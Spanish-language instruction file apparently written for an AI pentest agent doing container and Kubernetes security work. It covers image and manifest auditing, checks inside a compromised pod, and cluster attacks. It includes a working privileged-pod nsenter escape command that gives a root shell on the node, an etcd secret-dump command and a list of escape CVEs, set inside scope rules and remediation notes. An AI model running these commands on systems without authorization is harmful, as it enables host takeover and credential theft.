# Container & Kubernetes Security — Docker · K8s · Runtime

Estás en modo de **container security**: análisis de imágenes Docker,
auditoría de despliegues, escape de contenedores, pentest de clusters
Kubernetes, abuso de orquestadores (Docker Swarm, K8s, Nomad).

## Cuándo usar esta skill

- Hay un `Dockerfile` / `docker-compose.yml` / Helm chart / K8s manifests
  en el alcance (auditoría).
- Has comprometido un pod Linux durante post-explotación y necesitas
  determinar si puedes escapar al host.
- El cliente expone un API server K8s en internet (raro pero ocurre) y
  necesitas enumerar / explotar.
- Ataque desde dentro de un pod hacia otros pods / nodos / cloud
  metadata.

## Prioridades

### Auditoría desde fuera (DevSecOps mode)
1. **Dockerfile lint**: `hadolint Dockerfile`. Mira FROM-base latest,
   USER root, ADD vs COPY, secrets en build.
2. **Image scan**: `trivy image registry/image:tag --severity HIGH,CRITICAL`.
   `grype` como alternativa. `dive` para revisar capas y filtrar
   secretos en layers anteriores.
3. **K8s manifests**: `kube-linter`, `kubesec`, `kubeaudit`, `checkov`,
   `kics`. Buscar: `runAsRoot`, `privileged: true`, `hostPath` mounts,
   `hostNetwork`, capabilities añadidas, falta de NetworkPolicy.
4. **Helm chart audit**: `helm template . | kubesec scan -`,
   `checkov -d ./helm-chart/`.

### Desde dentro de un pod comprometido
1. **Container fingerprint**: `cat /.dockerenv`, `cat /proc/1/cgroup`,
   `cat /proc/self/status | grep CapEff`. Identificar runtime (Docker /
   containerd / CRI-O) y capabilities.
2. **Detectar K8s**: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
   (si existe → estás en K8s con SA token).
3. **Capabilities check**: `capsh --print`. CAP_SYS_ADMIN → escape
   trivial. CAP_NET_RAW + ARP spoofing posible.
4. **Mount check**: `mount`, `findmnt`. Volume `hostPath:/` montado →
   escape inmediato.
5. **Docker socket leak**: `ls -la /var/run/docker.sock`. Si existe →
   pwn el host completo via Docker API.
6. **K8s API enumeration**: `kubectl auth can-i --list` (con el SA
   token). Si puede `create pods` → escape via privileged pod.

### Ataque al cluster K8s
1. **Recon API server**: `kube-hunter --remote <api>` (sin auth) o
   `kube-hunter --pod` (desde dentro).
2. **etcd access**: si etcd está expuesto sin auth (CVE-2018-...),
   `etcdctl get / --prefix --keys-only` lee toda la config + secrets.
3. **kubelet API**: `:10250` sin auth (raro pero pasa) permite ejecutar
   en cualquier pod.
4. **RBAC abuse**: `bind-cluster-role` mal configurado, default SA con
   permisos amplios, exec into kube-system.
5. **Privileged pod abuse**: crear pod con `privileged: true` +
   `hostPID` + `nsenter` → root en el nodo.

## Herramientas preferidas

- **Image scan**: `trivy`, `grype`, `snyk container`, `dockle` (CIS
  compliance), `dive` (layer inspection).
- **Dockerfile lint**: `hadolint`, `dockerfilelint`, `checkov` (también
  IaC).
- **K8s scan estático**: `kube-linter`, `kubesec`, `kubeaudit`,
  `checkov`, `kics`, `datree`, `popeye`.
- **K8s pentest activo**: `kube-hunter` (recon), `kube-bench` (CIS
  benchmark), `peirates` (post-exploitation desde pod), `kubeletctl`
  (abuse kubelet).
- **Escape primitives**: `nsenter`, `runc` exploit (CVE-2019-5736),
  `chroot` con capabilities, `release_agent` (CVE-2022-0492 — cgroups
  v1 escape).
- **Service mesh / API**: `kubectl` siempre primero. `k9s` (TUI). `kubie`
  (context switching).
- **Falco runtime detection** (info defensiva): si el cliente lo usa,
  `falco --list` muestra reglas activas.

## Reglas operativas

- **Capabilities mapping**: cada container CAP es un vector específico.
  Tabla de equivalencias:
  - `CAP_SYS_ADMIN` → escape trivial (mount, namespace).
  - `CAP_SYS_PTRACE` → process injection en otros containers del nodo.
  - `CAP_NET_RAW` → packet crafting (ARP spoof intra-pod).
  - `CAP_DAC_READ_SEARCH` → bypass file permissions.
- **PodSecurityPolicy / Pod Security Admission**: si están activas,
  documenta cuáles bloquean tus pods test antes de gastar tiempo en
  payloads que serán rechazados.
- **Pull policy `Always` con imagen pública**: vector clásico — si
  pwneas Docker Hub publishing del tag, RCE en próximo restart.
- **Sin descontrol de pods**: no crear 100 pods de prueba en cluster
  productivo. Crear los mínimos, en namespace temporal, borrar al
  cierre.
- **Sin scaling abuse**: no abusar HPA para tirar el cluster — es DoS.

## Fuera de scope

- **DoS** del cluster (resource exhaustion intencional).
- **Modificación de workloads productivos** del cliente: nada de
  `kubectl edit` sobre Deployments en producción.
- **Imágenes en registries públicos**: si encuentras secrets en
  imágenes públicas del cliente, anotar pero NO publicar el
  hallazgo.

## Salida esperada

En `attack-surface.md` (vía TARGET_UPDATE):

```
## [2026-05-17 14:00] Container audit — empresa1/api-gateway:v1.4.2
- **Dockerfile findings (hadolint)**:
  - DL3008: apt sin pin de versión
  - DL3025: USER no especificado → ejecuta como root
- **Image scan (trivy)**:
  - 3 CRITICAL: log4j-core 2.14.1 (CVE-2021-44228), bash 5.0 (CVE-2019-18276), openssl 1.1.1 (CVE-2022-0778)
  - 12 HIGH
- **Layer diff (dive)**: layer 5 incluye `.env` con AWS credentials → leak en image push pública
```

En `notes.md` (vía TARGET_UPDATE), cada escape confirmado:

```
## [2026-05-17 14:30] [K8S-001] Container escape via privileged pod
- **Pod inicial**: comprometido vía RCE en app web (apache pod en ns 'web')
- **Vector**: SA token tiene `create pods` en ns 'web'
- **PoC**:
    kubectl run --image=alpine pwn --privileged \
      --overrides='{"spec":{"hostNetwork":true,"hostPID":true,
                            "containers":[{"name":"pwn","image":"alpine",
                              "command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh"]}]}}'
- **Resultado**: shell root en el nodo K8s (worker-3.cluster.local)
- **Cleanup**: `kubectl delete pod pwn -n web`
- **Recomendación**: PodSecurityPolicy/PSA restrictiva, RBAC mínimo,
  forbid privileged containers cluster-wide.
```

## Skills relacionadas

- `cloud_security` — overlap fuerte cuando K8s corre en EKS/AKS/GKE
  (IAM del cluster = IAM cloud).
- `post_exploitation` — para escalada local dentro de un pod
  comprometido antes del escape.
- `code_security_review` — Dockerfile y manifests también son SAST IaC.
- `exploitation` — para CVEs específicos del kernel del host tras escape.
